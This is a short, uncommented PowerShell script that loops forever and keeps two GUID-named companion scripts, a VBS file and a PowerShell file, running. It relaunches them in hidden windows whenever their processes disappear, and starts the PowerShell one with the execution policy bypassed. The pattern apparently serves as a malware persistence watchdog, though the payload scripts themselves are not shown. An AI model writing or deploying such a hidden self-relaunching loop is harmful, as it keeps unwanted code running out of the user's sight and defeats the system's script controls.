while ($true) {
    $processes = Get-Process wscript -ErrorAction SilentlyContinue
    if ($processes) {
        $processCount = $processes.Count
    } else {
        $processCount = 0
    }

    if ($processCount -eq 0) {
        Start-Process "8ae5ba55-53fe-4ce3-a653-28a6accbd50b.vbs" -WindowStyle Hidden
    }

    $processes = Get-Process powershell -ErrorAction SilentlyContinue
    if ($processes) {
        $processCount = $processes.Count
    } else {
        $processCount = 0
    }

    if ($processCount -eq 1) {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"917b73f6-ef2b-4cd5-898d-d284dbb2cea6.ps1`"" -WindowStyle Hidden
    }

    Start-Sleep -Milliseconds 1
}